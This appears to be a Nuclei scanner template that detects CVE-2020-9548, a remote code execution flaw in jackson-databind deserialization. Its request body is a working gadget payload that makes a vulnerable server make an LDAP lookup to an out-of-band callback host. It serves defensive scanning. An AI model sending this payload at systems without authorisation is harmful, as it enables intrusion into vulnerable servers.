id: CVE-2020-9548

info:
  name: FasterXML Jackson Databind <=2.9.10.4 - Remote Code Execution
  author: tomaquet18
  severity: critical
  description: |
    FasterXML jackson-databind before 2.9.10.4 allows unsafe deserialization via the br.com.anteros.dbcp.AnterosDBCPConfig class, which can be exploited for Remote Code Execution (RCE) when `enableDefaultTyping` is enabled and a vulnerable classpath gadget is available.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-9548
    - https://github.com/fairyming/CVE-2020-9548
    - https://www.sangfor.com/blog/cybersecurity/fasterxml-jackson-databind-remote-code-execution-vulnerability-cve-2020-9548
  tags: cve,cve2020,jackson,jackson-databind,deserialization,anteros,oast,rce,json,java,unsafe-deserialization
  remediation: |
    Upgrade `jackson-databind` to version 2.9.10.4 or later.
    Do not enable default typing or allow untrusted input to be deserialized.
    Sanitize and validate incoming data.
  metadata:
    verified: false

flow: http()

http:
  - method: POST
    path:
      - "{{BaseURL}}"

    headers:
      Content-Type: application/json

    body: |
      [
        "br.com.anteros.dbcp.AnterosDBCPConfig",
        {
          "healthCheckRegistry": "ldap://{{interactsh-url}}"
        }
      ]

    matchers:
      # Use internal matcher to avoid duplicate match events caused by multiple DNS lookups (e.g. A and AAAA queries).
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
        internal: true

    extractors:
      - type: dsl
        dsl:
          - "BaseURL"
